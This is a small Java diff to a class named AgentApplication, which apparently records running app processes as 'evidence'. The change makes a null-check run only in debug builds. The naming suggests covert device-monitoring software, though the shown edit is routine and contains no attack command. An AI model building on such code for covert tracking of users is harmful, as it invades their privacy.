@@ -56,7 +56,7 @@ public class AgentApplication extends AgentBase implements Observer<ProcessInfo>
 	}
 
 	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
-		Check.requires(process != null, "null process");
+		if(Cfg.DEBUG) Check.requires(process != null, "null process");
 
 		String name = process.processName;
 		String module = process.processName;
